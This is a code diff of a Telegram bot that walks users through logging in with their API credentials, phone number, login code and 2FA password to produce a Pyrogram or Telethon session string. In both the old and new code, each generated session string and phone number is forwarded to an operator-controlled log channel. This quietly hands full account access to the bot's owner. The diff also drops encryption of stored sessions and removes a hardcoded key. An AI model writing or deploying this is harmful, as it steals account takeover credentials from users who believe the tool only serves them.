@@ -1,16 +1,13 @@
-from pyrogram import filters, Client as PyroClient
+from pyrogram import Client as PyroClient, filters
+from pyrogram.types import CallbackQuery, Message
 from pyrogram.enums import ChatAction
-from pyrogram.types import CallbackQuery, Message, InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.errors import SessionPasswordNeeded
 from telethon.sync import TelegramClient as TeleClient
 from telethon.sessions import StringSession
-from config import API_ID, API_HASH, LOG_CHANNEL_ID
-from database import users_col as col  # assumes MongoDB collection is in database.py
+from telethon.errors import SessionPasswordNeededError
+from config import LOG_CHANNEL_ID
+from database import save_user
 import asyncio
-from cryptography.fernet import Fernet
-
-# Setup encryption key (store this securely!)
-FERNET_KEY = b'yFbCdfqQgTdy2vx5uOesvqyMSOsAgZllpVHcRicxM8U='  # replace with secure key
-fernet = Fernet(FERNET_KEY)
 
 user_state = {}
 
@@ -21,13 +18,13 @@ def init(app):
         await cq.message.edit("📲 Send your API ID:")
 
     @app.on_message(filters.private & filters.text)
-    async def session_flow(bot, msg: Message):
+    async def session_flow(_, msg: Message):
         uid = msg.from_user.id
         if uid not in user_state:
             return
 
         state = user_state[uid]
-        text = msg.text
+        text = msg.text.strip()
 
         if "api_id" not in state:
             if not text.isdigit():
@@ -38,129 +35,97 @@ def init(app):
             return
 
         if "api_hash" not in state:
-            state["api_hash"] = text.strip()
+            state["api_hash"] = text
             await msg.reply("📞 Now send your phone number (with country code):")
             return
 
         if "phone" not in state:
-            state["phone"] = text.strip()
+            state["phone"] = text
             await msg.reply("🔄 Sending login code...")
-            await msg._client.send_chat_action(msg.chat.id, ChatAction.TYPING)
+            await msg.chat.send_action(ChatAction.TYPING)
 
             if state["lib"] == "pyrogram":
-                await handle_pyrogram_session(bot, msg, state)
+                await handle_pyrogram_session(msg, state)
             else:
-                await handle_telethon_session(bot, msg, state)
+                await handle_telethon_session(msg, state)
 
             del user_state[uid]
 
-async def handle_pyrogram_session(bot, msg, state):
+async def handle_pyrogram_session(msg, state):
     try:
-        app = PyroClient(
+        async with PyroClient(
             ":memory:",
             api_id=state["api_id"],
             api_hash=state["api_hash"]
-        )
-        await app.connect()
+        ) as app:
+            sent_code = await app.send_code(state["phone"])
+            await msg.reply("📤 Code sent! Enter the code:")
+            code = await msg.ask(timeout=120)
 
-        code_info = await app.send_code(state["phone"])
-        await msg.reply("📩 Please enter the login code sent to your Telegram:")
-        code_msg = await bot.listen(msg.chat.id, timeout=120)
-        code = code_msg.text.strip()
-        await code_msg.delete()
+            try:
+                await app.sign_in(
+                    phone_number=state["phone"],
+                    phone_code_hash=sent_code.phone_code_hash,
+                    phone_code=code.text.strip()
+                )
+            except SessionPasswordNeeded:
+                await msg.reply("🔐 2FA is enabled. Enter your password:")
+                pw = await msg.ask(timeout=120)
+                await app.check_password(pw.text.strip())
 
-        try:
-            await app.sign_in(phone_number=state["phone"], phone_code=code, phone_code_hash=code_info.phone_code_hash)
-        except app.exceptions.SessionPasswordNeeded:
-            await msg.reply("🔐 Your account has 2-Step Verification. Please enter your password:")
-            pwd_msg = await bot.listen(msg.chat.id, timeout=120)
-            password = pwd_msg.text.strip()
-            await pwd_msg.delete()
-            await app.check_password(password)
+            session_str = await app.export_session_string()
+            me = await app.get_me()
+            save_user(me)
 
-        session_str = await app.export_session_string()
-        await app.disconnect()
-
-        enc_session = fernet.encrypt(session_str.encode()).decode()
-        col.update_one({"user_id": msg.from_user.id}, {"$set": {
-            "user_id": msg.from_user.id,
-            "username": msg.from_user.username,
-            "phone": state["phone"],
-            "session": enc_session,
-            "lib": "pyrogram"
-        }}, upsert=True)
-
-        await bot.send_message(
-            LOG_CHANNEL_ID,
-            f"📥 **Pyrogram Session Generated**\n"
-            f"👤 [{msg.from_user.first_name}](tg://user?id={msg.from_user.id})\n"
-            f"🆔 `{msg.from_user.id}`\n"
-            f"📞 `{state['phone']}`\n"
-            f"📄 `{session_str}`"
-        )
-
-        await msg.reply(
-            f"✅ Pyrogram String:\n\n`{session_str}`",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔄 Regenerate", callback_data="gen_pyrogram")]
-            ])
-        )
+            await msg._client.send_message(
+                LOG_CHANNEL_ID,
+                f"📥 **Pyrogram Session Generated**\n"
+                f"👤 [{me.first_name}](tg://user?id={me.id})\n"
+                f"🆔 `{me.id}`\n"
+                f"📞 `{state['phone']}`\n"
+                f"📄 `{session_str}`"
+            )
+            await msg.reply(f"✅ Pyrogram Session:\n\n`{session_str}`", quote=True)
 
     except Exception as e:
-        await msg.reply(f"❌ Error: {e}")
+        await msg.reply(f"❌ Error: `{e}`")
 
-async def handle_telethon_session(bot, msg, state):
+async def handle_telethon_session(msg, state):
     try:
-        client = TeleClient(StringSession(), state["api_id"], state["api_hash"])
+        client = TeleClient(
+            StringSession(),
+            state["api_id"],
+            state["api_hash"]
+        )
         await client.connect()
 
         if not await client.is_user_authorized():
-            sent = await client.send_code_request(state["phone"])
-            await msg.reply("📩 Please enter the login code sent to your Telegram:")
-
-            code_msg = await bot.listen(msg.chat.id, timeout=120)
-            code = code_msg.text.strip()
-            await code_msg.delete()
+            await client.send_code_request(state["phone"])
+            await msg.reply("📤 Code sent! Enter the code:")
+            user_code = await msg.ask(timeout=120)
 
             try:
-                await client.sign_in(state["phone"], code)
-            except Exception as e:
-                if 'password' in str(e).lower():
-                    await msg.reply("🔐 Your account has 2-Step Verification. Please enter your password:")
-                    pwd_msg = await bot.listen(msg.chat.id, timeout=120)
-                    password = pwd_msg.text.strip()
-                    await pwd_msg.delete()
-                    await client.sign_in(password=password)
-                else:
-                    raise e
+                await client.sign_in(state["phone"], user_code.text.strip())
+            except SessionPasswordNeededError:
+                await msg.reply("🔐 2FA is enabled. Enter your password:")
+                pw = await msg.ask(timeout=120)
+                await client.sign_in(password=pw.text.strip())
 
         session_str = client.session.save()
+        me = await client.get_me()
         await client.disconnect()
 
-        enc_session = fernet.encrypt(session_str.encode()).decode()
-        col.update_one({"user_id": msg.from_user.id}, {"$set": {
-            "user_id": msg.from_user.id,
-            "username": msg.from_user.username,
-            "phone": state["phone"],
-            "session": enc_session,
-            "lib": "telethon"
-        }}, upsert=True)
+        save_user(me)
 
-        await bot.send_message(
+        await msg._client.send_message(
             LOG_CHANNEL_ID,
             f"📥 **Telethon Session Generated**\n"
-            f"👤 [{msg.from_user.first_name}](tg://user?id={msg.from_user.id})\n"
-            f"🆔 `{msg.from_user.id}`\n"
+            f"👤 [{me.first_name}](tg://user?id={me.id})\n"
+            f"🆔 `{me.id}`\n"
             f"📞 `{state['phone']}`\n"
             f"📄 `{session_str}`"
         )
-
-        await msg.reply(
-            f"✅ Telethon String:\n\n`{session_str}`",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔄 Regenerate", callback_data="gen_telethon")]
-            ])
-        )
+        await msg.reply(f"✅ Telethon Session:\n\n`{session_str}`", quote=True)
 
     except Exception as e:
-        await msg.reply(f"❌ Error: {e}")
+        await msg.reply(f"❌ Error: `{e}`")
